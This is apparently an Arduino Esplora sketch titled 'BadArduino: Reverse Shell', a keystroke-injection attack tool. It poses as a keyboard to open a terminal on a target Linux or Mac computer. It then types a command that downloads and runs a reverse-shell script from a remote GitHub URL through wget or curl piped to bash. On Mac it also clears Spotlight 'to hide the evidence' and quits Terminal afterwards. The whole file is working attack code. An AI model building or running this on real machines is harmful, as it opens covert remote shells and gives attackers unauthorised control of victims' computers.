#include <Esplora.h>
#include <TFT.h>
#include <SPI.h>
#include <Keyboard.h>

int width, height;
int line_height = 22; // Font size is 20, plus line spacing

void setup() {
  // put your setup code here, to run once:
  EsploraTFT.begin();
  EsploraTFT.setTextSize(2);
  width = EsploraTFT.width();
  height = EsploraTFT.height();
  shell_menu_init();
}

int prevOS = 0;
int os = 0; // 0 = Linux, 1 = Mac, 2 = Windows
char oses[3][10] = {"Linux", "Mac", "Windows"};

void shell_menu_init() {
  // put your main code here, to run repeatedly:
  EsploraTFT.background(0,0,0);
  EsploraTFT.stroke(255,255,255);
  EsploraTFT.text("BadArduino:", 0, 0);
  EsploraTFT.text("Reverse Shell", 0, line_height);
  for (int i = 0; i < 3; i++){
    int y = (line_height * i) + (line_height * 2 + 5);
    if (os == i){ // This is the selected OS, so highlight the text
      EsploraTFT.fill(255,255,255);
      EsploraTFT.rect(0,y-4,width,line_height+2);
      EsploraTFT.stroke(0,0,0);
    } else {
      EsploraTFT.stroke(255,255,255);
    }
    EsploraTFT.text(oses[i], 2, y);
  }
}

void shell_menu_loop() {
  // put your main code here, to run repeatedly:

  // Detect whether to switch mode
  if (Esplora.readButton(JOYSTICK_DOWN) == LOW) os++;
  else if (Esplora.readButton(JOYSTICK_UP) == LOW) os--;
  if (os >= 3) os = 0;
  if (os <= -1) os = 2;

  // Draw menu if it has changed
  if (os != prevOS){
    // Clear previous OS
    int y = (line_height * prevOS) + (line_height * 2 + 5);
    EsploraTFT.fill(0,0,0);
    EsploraTFT.rect(0,y-4,width,line_height+2);
    EsploraTFT.stroke(255,255,255);
    EsploraTFT.text(oses[prevOS], 2, y);
    prevOS = os;
    // Highlight new OS
    y = (line_height * os) + (line_height * 2 + 5);
    EsploraTFT.fill(255,255,255);
    EsploraTFT.rect(0,y-4,width,line_height+2);
    EsploraTFT.stroke(0,0,0);
    EsploraTFT.text(oses[os], 2, y);
    delay(250);
  }
}

void loop() {
  // put your main code here, to run repeatedly:
  shell_menu_loop();
  if(Esplora.readButton(SWITCH_RIGHT) == LOW){
    EsploraTFT.fill(0,0,0);
    EsploraTFT.rect(0,0,width,height);
    EsploraTFT.stroke(255,255,255);
    if (os == 2) { // Windows
      EsploraTFT.text("Coming soon",0,height/2-10);
      delay(1000);
    } else {
      EsploraTFT.text("Injecting...",0,height/2-10);
      inject_shell();
    }
    shell_menu_init();
  }
}

void inject_shell(){
  Keyboard.begin();

  switch (os){
    case 0: // Linux
      // Open terminal
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      delay(100);
      Keyboard.releaseAll();
      delay(1000);
      // Install the script and exit the terminal
      Keyboard.print("wget -O - https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_linux.sh | bash; exit");
      Keyboard.write(KEY_RETURN);
      break;
    case 1: // Mac
      // Open Spotlight search
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Open terminal
      Keyboard.print("Terminal");
      delay(250);
      Keyboard.write(KEY_RETURN);
      // Open Spotlight search again
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Clear Spotlight search to hide the evidence
      Keyboard.write(KEY_BACKSPACE);
      delay(250);
      Keyboard.write(KEY_ESC);
      delay(1500);
      // Terminate any current processes
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('c');
      delay(100);
      Keyboard.releaseAll();
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(100);
      // In the Terminal run a command
      Keyboard.print("bash <(curl -s https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_mac.sh)");
      Keyboard.write(KEY_RETURN);
      delay(5000); // TODO: Figure out how long it will take to install the script
      // Quit the Terminal
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('q');
      delay(100);
      Keyboard.releaseAll();
  }
  delay(100);
  Keyboard.end();
}

